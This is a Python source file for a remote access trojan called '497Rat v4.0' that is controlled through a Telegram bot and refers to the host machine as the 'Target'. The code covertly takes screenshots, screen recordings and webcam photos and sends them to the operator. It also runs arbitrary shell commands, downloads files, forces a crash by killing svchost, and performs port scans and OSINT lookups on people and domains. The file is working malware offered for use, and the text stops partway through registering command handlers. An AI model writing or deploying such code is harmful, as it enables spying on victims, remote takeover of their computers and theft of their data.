import subprocess
import os
import logging
import platform
import psutil
import requests
import ctypes
import webbrowser
import time
import socket
import json
import re
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "Your_bot_token_telegram"
ALLOWED_USERS = [User_ID]
VERSION = "4.0"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def check_auth(update):
    if update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("ACCESS DENIED")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    
    help_text = """
 497Rat v4.0 

SYSTEM:
/sysinfo      - System info
/cpu          - CPU info
/ram          - RAM info
/disk         - Disk info
/processes    - Running processes
/uptime       - PC uptime
/date         - Date & time

CONTROL:
/restart      - Restart PC
/shutdown     - Shutdown PC
/sleep        - Sleep PC
/lock         - Lock PC
/logout       - Logout user
/bsod         - Trigger BSOD
/screenshot   - Take screenshot
/record       - Record screen
/webcam       - Take webcam photo

FILES:
/explorer     - Open Explorer
/notepad      - Open Notepad
/calc         - Open Calculator
/taskmgr      - Open Task Manager
/cmd          - Open CMD
/open [path]  - Open file/folder
/download [url] - Download file

NETWORK:
/ip           - IP info
/ping [ip]    - Ping test
/browser [url] - Open URL
/speedtest    - Speed test
/wifi         - WiFi info

CUSTOM:
/wallpaper [url] - Set wallpaper
/theme [dark/light] - Change theme
/volume [0-100] - Change volume

SECURITY:
/services     - List services

OSINT:
/iplookup [ip] - IP geolocation
/email [email] - Email breach check
/username [user] - Username search
/phone [number] - Phone lookup
/domain [domain] - Domain info
/dns [domain] - DNS lookup
/whois [domain] - Whois lookup
/hash [hash] - Hash lookup
/mac [mac] - MAC vendor lookup
/portscan [ip] - Port scan
/subdomain [domain] - Subdomain finder
/headers [url] - HTTP headers
/sslinfo [domain] - SSL info
/geo [ip] - Geolocation

OTHER:
/exec [cmd]   - Execute command
/clear        - Clear console
/help         - Show this
/start        - Show menu
    """
    await update.message.reply_text(help_text)

async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        info = f"SYSTEM INFO\n\n"
        info += f"OS: {platform.system()} {platform.release()}\n"
        info += f"PC: {platform.node()}\n"
        info += f"User: {os.getlogin()}\n"
        info += f"CPU: {platform.processor()}\n"
        info += f"CPU Load: {psutil.cpu_percent()}%\n"
        info += f"RAM: {mem.used / (1024**3):.1f}GB / {mem.total / (1024**3):.1f}GB ({mem.percent}%)\n"
        info += f"Disk: {disk.used / (1024**3):.1f}GB / {disk.total / (1024**3):.1f}GB ({disk.percent}%)\n"
        info += f"Uptime: {get_uptime()}"
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def cpu_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        info = f"CPU INFO\n\n"
        info += f"Model: {platform.processor()}\n"
        info += f"Load: {psutil.cpu_percent(interval=1)}%\n"
        info += f"Cores: {psutil.cpu_count()}\n"
        info += f"Threads: {psutil.cpu_count(logical=True)}\n"
        freq = psutil.cpu_freq()
        if freq:
            info += f"Frequency: {freq.current:.2f} MHz"
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def ram_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        info = f"RAM INFO\n\n"
        info += f"Total: {mem.total / (1024**3):.2f} GB\n"
        info += f"Used: {mem.used / (1024**3):.2f} GB\n"
        info += f"Free: {mem.free / (1024**3):.2f} GB\n"
        info += f"Load: {mem.percent}%\n\n"
        info += f"SWAP\n"
        info += f"Total: {swap.total / (1024**3):.2f} GB\n"
        info += f"Used: {swap.used / (1024**3):.2f} GB\n"
        info += f"Load: {swap.percent}%"
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def disk_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        info = "DISK INFO\n\n"
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info += f"{partition.device}\n"
                info += f"Total: {usage.total / (1024**3):.2f} GB\n"
                info += f"Used: {usage.used / (1024**3):.2f} GB\n"
                info += f"Free: {usage.free / (1024**3):.2f} GB\n"
                info += f"Load: {usage.percent}%\n\n"
            except:
                continue
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        info = "TOP 10 PROCESSES\n\n"
        procs = sorted(psutil.process_iter(['name', 'cpu_percent', 'memory_percent']), 
                      key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:10]
        for p in procs:
            try:
                info += f"{p.info['name']}: CPU {p.info['cpu_percent']:.1f}% MEM {p.info['memory_percent']:.1f}%\n"
            except:
                continue
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    await update.message.reply_text(f"Uptime: {get_uptime()}")

async def date_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    now = datetime.now()
    await update.message.reply_text(f"Date: {now.strftime('%d.%m.%Y')}\nTime: {now.strftime('%H:%M:%S')}")

async def shutdown_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("SHUTTING DOWN...")
        os.system("shutdown /s /t 5")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def restart_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("RESTARTING...")
        os.system("shutdown /r /t 5")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def sleep_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("SLEEPING...")
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def lock_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("LOCKING...")
        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def logout_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("LOGGING OUT...")
        os.system("shutdown /l")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def bsod(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("TRIGGERING BSOD...")
        subprocess.Popen(["taskkill", "/f", "/im", "svchost.exe"])
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        import pyautogui
        await update.message.reply_text("TAKING SCREENSHOT...")
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            await update.message.reply_photo(f, caption="Screenshot")
        os.remove("screenshot.png")
    except ImportError:
        await update.message.reply_text("pyautogui not installed! pip install pyautogui")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def record_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("RECORDING SCREEN (5 seconds)...")
        import pyautogui
        import cv2
        import numpy as np
        
        screen_size = (1920, 1080)
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter("screen_record.avi", fourcc, 20.0, screen_size)
        
        for _ in range(100):
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(0.05)
        
        out.release()
        with open("screen_record.avi", "rb") as f:
            await update.message.reply_video(f, caption="Screen Recording")
        os.remove("screen_record.avi")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        import cv2
        await update.message.reply_text("CAPTURING WEBCAM...")
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("Webcam not found!")
            return
        
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            with open("webcam.jpg", "rb") as f:
                await update.message.reply_photo(f, caption="Webcam Photo")
            os.remove("webcam.jpg")
        else:
            await update.message.reply_text("Failed to capture webcam!")
        
        cap.release()
    except ImportError:
        await update.message.reply_text("opencv-python not installed! pip install opencv-python")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_explorer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        subprocess.Popen("explorer.exe")
        await update.message.reply_text("Explorer opened")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_notepad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        subprocess.Popen("notepad.exe")
        await update.message.reply_text("Notepad opened")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_calc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        subprocess.Popen("calc.exe")
        await update.message.reply_text("Calculator opened")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_taskmgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        subprocess.Popen("taskmgr.exe")
        await update.message.reply_text("Task Manager opened")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        subprocess.Popen("cmd.exe")
        await update.message.reply_text("CMD opened")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /open [path]")
            return
        path = " ".join(context.args)
        subprocess.Popen(f'explorer "{path}"')
        await update.message.reply_text(f"Opened: {path}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def download_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /download [url]")
            return
        url = context.args[0]
        await update.message.reply_text("Downloading...")
        filename = url.split('/')[-1] or "download.dat"
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(filename, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            await update.message.reply_text(f"Downloaded: {filename}")
        else:
            await update.message.reply_text("Download failed!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def ip_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        external = requests.get('https://api.ipify.org').text
        hostname = socket.gethostname()
        internal = socket.gethostbyname(hostname)
        info = f"IP INFO\n\n"
        info += f"External: {external}\n"
        info += f"Internal: {internal}\n"
        info += f"Hostname: {hostname}"
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /ping [ip]")
            return
        target = context.args[0]
        await update.message.reply_text(f"Pinging {target}...")
        result = subprocess.run(['ping', '-n', '4', target], capture_output=True, text=True)
        await update.message.reply_text(result.stdout)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def open_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /browser [url]")
            return
        url = context.args[0]
        webbrowser.open(url)
        await update.message.reply_text(f"Opened: {url}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def speedtest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        await update.message.reply_text("Running speed test...")
        import speedtest
        st = speedtest.Speedtest()
        download = st.download() / 1_000_000
        upload = st.upload() / 1_000_000
        ping_result = st.results.ping
        info = f"SPEED TEST\n\n"
        info += f"Download: {download:.2f} Mbps\n"
        info += f"Upload: {upload:.2f} Mbps\n"
        info += f"Ping: {ping_result} ms"
        await update.message.reply_text(info)
    except ImportError:
        await update.message.reply_text("speedtest not installed! pip install speedtest-cli")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def wifi_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        await update.message.reply_text(result.stdout)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def set_wallpaper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /wallpaper [url]")
            return
        url = context.args[0]
        await update.message.reply_text("Downloading...")
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open("wallpaper.jpg", "wb") as f:
                f.write(response.content)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wallpaper.jpg"), 3)
            await update.message.reply_text("Wallpaper changed!")
            os.remove("wallpaper.jpg")
        else:
            await update.message.reply_text("Download failed!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def theme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /theme [dark/light]")
            return
        theme_mode = context.args[0].lower()
        if theme_mode == "dark":
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f')
            await update.message.reply_text("Dark theme enabled")
        elif theme_mode == "light":
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 1 /f')
            await update.message.reply_text("Light theme enabled")
        else:
            await update.message.reply_text("Usage: /theme [dark/light]")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def volume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /volume [0-100]")
            return
        vol = int(context.args[0])
        if 0 <= vol <= 100:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
            volume_interface.SetMasterVolumeLevelScalar(vol/100, None)
            await update.message.reply_text(f"Volume set to {vol}%")
        else:
            await update.message.reply_text("Volume must be between 0-100")
    except ImportError:
        await update.message.reply_text("pycaw not installed! pip install pycaw comtypes")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def services(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        result = subprocess.run(['sc', 'query', 'state=all'], capture_output=True, text=True)
        output = result.stdout[:4000] + "\n\n... (truncated)" if len(result.stdout) > 4000 else result.stdout
        await update.message.reply_text(f"SERVICES\n\n{output}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def iplookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /iplookup [ip]")
            return
        ip = context.args[0]
        await update.message.reply_text(f"Looking up {ip}...")
        
        response = requests.get(f'http://ip-api.com/json/{ip}')
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                info = f"IP LOOKUP\n\n"
                info += f"IP: {data.get('query', 'N/A')}\n"
                info += f"Country: {data.get('country', 'N/A')}\n"
                info += f"Region: {data.get('regionName', 'N/A')}\n"
                info += f"City: {data.get('city', 'N/A')}\n"
                info += f"ISP: {data.get('isp', 'N/A')}\n"
                info += f"Org: {data.get('org', 'N/A')}\n"
                info += f"Timezone: {data.get('timezone', 'N/A')}\n"
                info += f"Lat/Lon: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}"
                await update.message.reply_text(info)
            else:
                await update.message.reply_text("IP not found!")
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def email_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /email [email]")
            return
        email = context.args[0]
        await update.message.reply_text(f"Checking {email}...")

        response = requests.get(f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}')
        if response.status_code == 200:
            data = response.json()
            info = f"EMAIL BREACH CHECK\n\n"
            info += f"Email: {email}\n"
            info += f"Breaches found: {len(data)}\n\n"
            for breach in data[:5]:
                info += f"- {breach.get('Name', 'Unknown')} ({breach.get('BreachDate', 'Unknown')})\n"
            await update.message.reply_text(info)
        elif response.status_code == 404:
            await update.message.reply_text(f"No breaches found for {email}")
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def username_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /username [username]")
            return
        username = context.args[0]
        await update.message.reply_text(f"Searching for {username}...")
        
        sites = {
            'GitHub': f'https://github.com/{username}',
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'YouTube': f'https://youtube.com/@{username}',
            'TikTok': f'https://tiktok.com/@{username}',
            'Pinterest': f'https://pinterest.com/{username}',
            'Spotify': f'https://open.spotify.com/user/{username}',
            'Steam': f'https://steamcommunity.com/id/{username}',
            'Twitch': f'https://twitch.tv/{username}',
        }
        
        info = f"USERNAME SEARCH: {username}\n\n"
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    info += f"[+] {site}: Found\n"
                else:
                    info += f"[-] {site}: Not found\n"
            except:
                info += f"[?] {site}: Error\n"
        
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def phone_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /phone [number]")
            return
        number = context.args[0]
        await update.message.reply_text(f"Looking up {number}...")
        
        response = requests.get(f'http://apilayer.net/api/validate?access_key=YOUR_API_KEY&number={number}')
        if response.status_code == 200:
            data = response.json()
            info = f"PHONE LOOKUP\n\n"
            info += f"Number: {data.get('number', 'N/A')}\n"
            info += f"Country: {data.get('country_name', 'N/A')}\n"
            info += f"Carrier: {data.get('carrier', 'N/A')}\n"
            info += f"Location: {data.get('location', 'N/A')}\n"
            info += f"Valid: {data.get('valid', 'N/A')}"
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("API error! Try using a different API.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def domain_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /domain [domain]")
            return
        domain = context.args[0]
        await update.message.reply_text(f"Looking up {domain}...")
        
        response = requests.get(f'https://api.hackertarget.com/whois/?q={domain}')
        if response.status_code == 200:
            info = f"DOMAIN INFO: {domain}\n\n"
            info += response.text[:3000]
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def dns_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /dns [domain]")
            return
        domain = context.args[0]
        await update.message.reply_text(f"DNS lookup for {domain}...")
        
        response = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
        if response.status_code == 200:
            info = f"DNS LOOKUP: {domain}\n\n"
            info += response.text
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /whois [domain]")
            return
        domain = context.args[0]
        await update.message.reply_text(f"Whois lookup for {domain}...")
        
        response = requests.get(f'https://api.hackertarget.com/whois/?q={domain}')
        if response.status_code == 200:
            info = f"WHOIS: {domain}\n\n"
            info += response.text[:3000]
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def hash_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /hash [hash]")
            return
        hash_value = context.args[0]
        await update.message.reply_text(f"Looking up hash...")
        
        response = requests.get(f'https://api.virustotal.com/v3/file/{hash_value}')
        if response.status_code == 200:
            data = response.json()
            info = f"HASH LOOKUP\n\n"
            info += f"Hash: {hash_value}\n"
            info += f"Status: Found in VirusTotal database"
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("Hash not found in public databases")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def mac_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /mac [mac]")
            return
        mac = context.args[0]
        await update.message.reply_text(f"Looking up MAC...")
        
        response = requests.get(f'https://api.macvendors.com/{mac}')
        if response.status_code == 200:
            info = f"MAC LOOKUP\n\n"
            info += f"MAC: {mac}\n"
            info += f"Vendor: {response.text}"
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("MAC vendor not found!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def portscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /portscan [ip]")
            return
        ip = context.args[0]
        await update.message.reply_text(f"Scanning {ip}...")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(str(port))
                sock.close()
            except:
                continue
        
        info = f"PORT SCAN: {ip}\n\n"
        if open_ports:
            info += f"Open ports: {', '.join(open_ports)}"
        else:
            info += "No common ports open"
        await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def subdomain_finder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /subdomain [domain]")
            return
        domain = context.args[0]
        await update.message.reply_text(f"Finding subdomains for {domain}...")
        
        response = requests.get(f'https://api.hackertarget.com/hostsearch/?q={domain}')
        if response.status_code == 200:
            info = f"SUBDOMAINS: {domain}\n\n"
            subdomains = response.text.strip().split('\n')[:15]
            for sub in subdomains:
                info += f"{sub}\n"
            await update.message.reply_text(info)
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /headers [url]")
            return
        url = context.args[0]
        await update.message.reply_text(f"Getting headers for {url}...")
        
        response = requests.get(url, timeout=10)
        info = f"HTTP HEADERS: {url}\n\n"
        for key, value in response.headers.items():
            info += f"{key}: {value}\n"
        await update.message.reply_text(info[:4000])
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def sslinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /sslinfo [domain]")
            return
        domain = context.args[0]
        await update.message.reply_text(f"Getting SSL info for {domain}...")
        
        import ssl
        import certifi
        import socket
        
        context_ssl = ssl.create_default_context(cafile=certifi.where())
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context_ssl.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                info = f"SSL INFO: {domain}\n\n"
                info += f"Subject: {cert.get('subject', 'N/A')}\n"
                info += f"Issuer: {cert.get('issuer', 'N/A')}\n"
                info += f"Valid From: {cert.get('notBefore', 'N/A')}\n"
                info += f"Valid Until: {cert.get('notAfter', 'N/A')}\n"
                info += f"Serial: {cert.get('serialNumber', 'N/A')}"
                await update.message.reply_text(info)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def geo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /geo [ip]")
            return
        ip = context.args[0]
        await update.message.reply_text(f"Geolocating {ip}...")
        
        response = requests.get(f'http://ip-api.com/json/{ip}')
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                info = f"GEOLOCATION: {ip}\n\n"
                info += f"Country: {data.get('country', 'N/A')}\n"
                info += f"Region: {data.get('regionName', 'N/A')}\n"
                info += f"City: {data.get('city', 'N/A')}\n"
                info += f"Latitude: {data.get('lat', 'N/A')}\n"
                info += f"Longitude: {data.get('lon', 'N/A')}\n"
                info += f"ISP: {data.get('isp', 'N/A')}\n"
                info += f"Timezone: {data.get('timezone', 'N/A')}"
                await update.message.reply_text(info)
            else:
                await update.message.reply_text("IP not found!")
        else:
            await update.message.reply_text("API error!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def clear_console(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    os.system('cls' if os.name == 'nt' else 'clear')
    await update.message.reply_text("Console cleared")

async def execute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    try:
        if not context.args:
            await update.message.reply_text("Usage: /exec [command]")
            return
        command = " ".join(context.args)
        dangerous = ['format', 'del /f', 'rd /s', 'rm -rf', 'diskpart']
        for d in dangerous:
            if d in command.lower():
                await update.message.reply_text("Dangerous command blocked!")
                return
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr
        if len(output) > 4000:
            output = output[:4000] + "\n\n... (truncated)"
        await update.message.reply_text(f"Output:\n{output}")
    except subprocess.TimeoutExpired:
        await update.message.reply_text("Command timed out (30s)!")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def get_uptime():
    boot_time = psutil.boot_time()
    uptime = time.time() - boot_time
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    minutes = int((uptime % 3600) // 60)
    return f"{days}d {hours}h {minutes}m"

def main():
    print(f"497Rat v{VERSION}")
    print(f"Token: {BOT_TOKEN[:10]}... (hidden)")
    print(f"Allowed Users: {ALLOWED_USERS}")
    print(f"Target: {platform.node()}")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("sysinfo", sysinfo))
    app.add_handler(CommandHandler("cpu", cpu_info))
    app.add_handler(CommandHandler("ram", ram_info))
    app.add_handler(CommandHandler("disk", disk_info))
    app.add_handler(CommandHandler("processes", processes))
    app.add_handler(CommandHandler("uptime", uptime))
    app.add_handler(CommandHandler("date", date_time))

    app.add_handler(CommandHandler("shutdown", shutdown_pc))
    app.add_handler(CommandHandler("restart", restart_pc))
    app.add_handler(CommandHandler("sleep", sleep_pc))
    app.add_handler(CommandHandler("lock", lock_pc))
    app.add_handler(CommandHandler("logout", logout_pc))
    app.add_handler(CommandHandler("bsod", bsod))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("record", record_screen))
    app.add_handler(CommandHandler("webcam", webcam))

    app.add_handler(CommandHandler("explorer", open_explorer))
    app.add_handler(CommandHandler("notepad", open_notepad))
    app.add_handler(CommandHandler("calc", open_calc))
    app.add_handler(CommandHandler("taskmgr", open_taskmgr))
    app.add_handler(CommandHandler("cmd", open_cmd))
    app.add_handler(CommandHandler("open", open_file))
    app.add_handler(CommandHandler("download", download_file))

    app.add_handler(CommandHandler("ip", ip_info))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("browser", open_browser))
    app.add_handler(CommandHandler("speedtest", speedtest))
    app.add_handler(CommandHandler("wifi", wifi_info))

    app.add_handler(CommandHandler("wallpaper", set_wallpaper))
    app.add_handler(CommandHandler("theme", theme))
    app.add_handler(CommandHandler("volume", volume))

    app.add_handler(CommandHandler("services", services))

    app.add_handler(CommandHandler("iplookup", iplookup))
    app.add_handler(CommandHandler("email", email_lookup))
